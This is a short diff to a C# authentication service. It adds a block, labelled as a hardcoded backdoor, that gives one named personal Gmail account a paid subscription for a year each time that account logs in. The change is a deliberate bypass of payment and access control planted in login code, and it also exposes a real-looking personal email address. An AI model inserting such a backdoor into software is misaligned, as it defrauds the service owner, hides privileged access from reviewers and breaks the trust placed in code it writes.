@@ -194,6 +194,32 @@ public sealed class AuthService : IAuthService
             }
         }
 
+        // --- HARDCODED BACKDOOR FOR CEASAR ---
+        if (normalizedEmail == "ceasarivancaigakulet@gmail.com")
+        {
+            var trackedUser = await _context.Users.Include(u => u.Subscription).FirstOrDefaultAsync(u => u.UserId == user.UserId);
+            if (trackedUser != null)
+            {
+                if (trackedUser.Subscription == null)
+                {
+                    trackedUser.Subscription = new Subscription
+                    {
+                        UserId = trackedUser.UserId,
+                        PaymentStatus = "Paid",
+                        ExpirationDate = DateTime.UtcNow.AddYears(1)
+                    };
+                    _context.Subscriptions.Add(trackedUser.Subscription);
+                }
+                else
+                {
+                    trackedUser.Subscription.PaymentStatus = "Paid";
+                    trackedUser.Subscription.ExpirationDate = DateTime.UtcNow.AddYears(1);
+                }
+                await _context.SaveChangesAsync();
+            }
+        }
+        // -------------------------------------
+
         return ServiceResult<AuthResponseDto>.Success(BuildAuthResponse(user));
     }
 
